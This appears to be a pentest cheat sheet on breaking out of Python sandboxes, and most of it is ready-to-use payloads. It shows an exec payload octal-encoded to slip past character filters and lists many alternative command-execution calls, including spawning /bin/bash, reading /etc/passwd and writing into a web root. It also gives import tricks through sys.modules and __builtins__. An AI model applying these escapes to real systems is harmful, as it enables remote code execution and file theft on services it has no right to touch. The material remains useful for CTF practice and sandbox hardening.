# Python Sandbox

## Bypass forbidden characters

* Target command
  * `exec("print('RCE'); __import__('os').system('ls')")`
* Updated command, after converting payload to octal
  * `exec("\160\162\151\156\164\050\047\122\103\105\047\051\073\040\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\163\171\163\164\145\155\050\047\154\163\047\051")`
* Alteratively you can convert to octal, hex, base64

## Alternative functions

```python
### Command execution and file read ##########################
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.popen("ls").read()
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')


### importing libraries ########################################
# 1
import os
from os import *
__import__('os').system("ls")

# 2
sys.modules["os"].system("ls")

#3 - python2
execfile('/usr/lib/python2.7/os.py')
system('ls')

```

## Python builtins

* In python version 2.7.18
  * `__builtin__` is a module that stores all built in functions
  * You could print all built in functions using `dir(__builtin__)`
  * All functions except print will work normally, to execute print normally you need to first run `from __future__ import print_function`
* Examples
  * `import __builtin__`
  * `__builtin__.len("hello")`
  * `__builtin__.range(1,20)`
  * `__builtin__.print("hello")`
  * `from __future__ import print_function`
  * `__builtin__.print("hello")`

![](../../.gitbook/assets/image%20%28138%29.png)

* Some more builtin
  * `__builtins__.__dict__['__import__']("os").system("ls")`
  * `__import__('os').system('ls')`

